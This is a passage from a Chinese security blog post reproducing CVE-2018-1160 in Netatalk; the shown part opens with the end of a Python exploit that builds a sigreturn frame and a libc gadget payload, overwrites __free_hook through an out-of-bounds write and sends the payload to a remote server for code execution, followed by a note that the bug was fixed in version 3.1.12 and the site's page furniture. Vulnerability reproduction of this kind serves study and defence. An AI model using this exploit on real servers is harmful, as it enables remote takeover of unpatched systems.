sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
sigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> system_addr
sigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> free_hook <span class="token operator">+</span> <span class="token number">8</span>
sigframe<span class="token punctuation">.</span>rsp <span class="token operator">=</span> free_hook

payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>libc_dlopen_mode_56<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> cmd<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x2ca0</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>dl_open_hook <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fgetpos64_207<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">0x18</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>setcontext_53<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>sigframe<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0x28</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment">#跳过前28字节</span>

io <span class="token operator">=</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span>port<span class="token punctuation">)</span>
command_free<span class="token punctuation">(</span>io<span class="token punctuation">,</span>free_hook<span class="token punctuation">)</span>  <span class="token comment">#触发越界写，将free_hook写入command</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>create_dsi<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#隐式调用free，促发call __free_hook</span></code></pre>

<p>验证：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310092343287.png" alt="image-20231009232820919"></p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310092343200.png" alt="image-20231009232712168"></p>
<p>本地的话大概1分钟不到就rce了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>此漏洞在3.1.12版本已被修复：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202308012358627.png" alt="image-20230628100543370"></p>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2023/06/19/Lin%E6%80%BB%E7%BA%BF/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>上一页</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
              2023-10-09 23:45:48
            </span>
            
                  <span class="post-tags">
                    <i class="iconfont icon-tags mr-10" title="标签"></i>
                    
                    <span class="span--tag mr-8">
                      <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="漏洞复现">
                        #漏洞复现
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">目录</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2018-1160"><span class="toc-text">CVE-2018-1160</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%AE%9A%E4%BD%8D"><span class="toc-text">漏洞定位</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80"><span class="toc-text">泄露地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">构造利用链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        







      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          <a title="github" target="_blank" rel="noopener" href="https://github.com/zh-Closure">
            <i class="iconfont icon-github"></i>
          </a>
        </li>
      
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">Copyright © 2023 Closure</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">email | 765003952@qq.com</a>
        
    </div>
  
  
    <div class="footer-views">
      
          本站总访问量<span id="busuanzi_value_site_pv"></span>次
        
      
      
          本站访客数<span id="busuanzi_value_site_uv"></span>人
        
      
    </div>
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="可露希尔大涨价……">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + CVE-2018-1160 + '&url=' + http%3A%2F%2Fexample.com%2F2023%2F10%2F09%2FCVE-2018-1160%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2023/10/09/CVE-2018-1160/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
